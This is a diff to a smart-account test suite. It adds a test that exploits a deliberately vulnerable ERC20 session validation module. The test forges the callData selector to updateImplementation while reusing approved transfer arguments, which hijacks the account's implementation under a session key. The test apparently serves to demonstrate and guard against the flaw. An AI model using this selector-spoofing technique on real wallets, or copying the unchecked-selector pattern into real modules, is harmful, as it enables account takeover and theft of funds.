@@ -1,5 +1,5 @@
 import { expect } from "chai";
-import { makeEcdsaSessionKeySignedUserOp, enableNewTreeForSmartAccountViaEcdsa, getERC20SessionKeyParams } from "../../utils/sessionKey";
+import { makeEcdsaSessionKeySignedUserOp, enableNewTreeForSmartAccountViaEcdsa, getERC20SessionKeyParams, addLeavesForSmartAccountViaEcdsa } from "../../utils/sessionKey";
 import { ethers, deployments, waffle } from "hardhat";
 import { makeEcdsaModuleUserOp, fillAndSign } from "../../utils/userOp";
 import { encodeTransfer } from "../../utils/testUtils";
@@ -73,6 +73,10 @@ describe("SessionKey: ERC20 Session Validation Module", async () => {
       entryPoint,
       ecdsaModule.address
     );
+
+    const vulnerableErc20SessionModule = await (
+      await ethers.getContractFactory("VulnerableERC20SessionValidationModule")
+    ).deploy();
     
     return {
       entryPoint: entryPoint,
@@ -87,6 +91,7 @@ describe("SessionKey: ERC20 Session Validation Module", async () => {
       sessionKeyData: sessionKeyData,
       leafData: leafData,
       merkleTree: merkleTree,
+      vulnerableErc20SessionModule: vulnerableErc20SessionModule,
     };
   });
 
@@ -301,6 +306,105 @@ describe("SessionKey: ERC20 Session Validation Module", async () => {
     ).to.be.revertedWith("FailedOp").withArgs(0, "AA23 reverted: ERC20SV Invalid Selector");
     expect(await mockToken.balanceOf(charlie.address)).to.equal(charlieTokenBalanceBefore);
 
+  });
+
+  it("should be able to execute arbitrary method instead of execute on a vulnerable module", async () => {
+    const {
+      entryPoint,
+      userSA,
+      sessionKeyManager,
+      mockToken,
+      ecdsaModule,
+      merkleTree,
+      vulnerableErc20SessionModule
+    } = await setupTests();
+
+    const tokenAmountToTransfer = ethers.utils.parseEther("0.7534");
+    mockToken.mint(charlie.address, tokenAmountToTransfer);
+
+    const SmartAccount = await ethers.getContractFactory("SmartAccount");
+
+    const { sessionKeyData, leafData } = await getERC20SessionKeyParams(
+      sessionKey.address,
+      mockToken.address,
+      charlie.address,
+      maxAmount,
+      0,
+      0,
+      vulnerableErc20SessionModule.address
+    );
+
+    const merkleTree2 = await addLeavesForSmartAccountViaEcdsa(
+      merkleTree,
+      [ethers.utils.keccak256(leafData)],
+      sessionKeyManager,
+      userSA.address,
+      smartAccountOwner,
+      entryPoint,
+      ecdsaModule.address
+    );
+
+    const txnDataAA1 = SmartAccount.interface.encodeFunctionData(
+      "execute_ncC",
+      [mockToken.address, 0, encodeTransfer(charlie.address, tokenAmountToTransfer.toString())]
+    );
+
+    const setImplSelector = ethers.utils.hexDataSlice(
+      ethers.utils.keccak256(
+        ethers.utils.toUtf8Bytes("updateImplementation(address)")
+      ),
+      0,
+      4
+    );
+
+    const spoofedData = setImplSelector + txnDataAA1.slice(10);
+    
+    const userOp = await fillAndSign(
+      {
+        sender: userSA.address,
+        callData: spoofedData,
+        preVerificationGas: 50000,
+      },
+      sessionKey,
+      entryPoint,
+      'nonce'
+    );
+
+    const paddedSig = ethers.utils.defaultAbiCoder.encode(
+      ["uint48", "uint48", "address", "bytes", "bytes32[]", "bytes"],
+      [ 
+        0, 
+        0, 
+        vulnerableErc20SessionModule.address, 
+        sessionKeyData, 
+        merkleTree2.getHexProof(
+          ethers.utils.keccak256(leafData)
+        ), 
+        userOp.signature
+      ]
+    );
+
+    const signatureWithModuleAddress = ethers.utils.defaultAbiCoder.encode(
+      ["bytes", "address"], 
+      [paddedSig, sessionKeyManager.address]
+    );
+    userOp.signature = signatureWithModuleAddress;
+
+    const transferUserOp = userOp;
+
+    const charlieTokenBalanceBefore = await mockToken.balanceOf(
+      charlie.address
+    );
+
+    await entryPoint.handleOps([transferUserOp], alice.address, {gasLimit: 10000000});
+    expect(await mockToken.balanceOf(charlie.address)).to.equal(
+      charlieTokenBalanceBefore
+    );
+
+    //console.log("trying to call balance on userSA which now points to mock token contract");
+    const userSA_ = await ethers.getContractAt("IERC20", userSA.address);
+    expect(await userSA_.balanceOf(charlie.address)).to.equal(BigNumber.from(0));
+    //console.log("balance via userSA    ", (await userSA_.balanceOf(charlie.address)).toString());
   });
   
 });
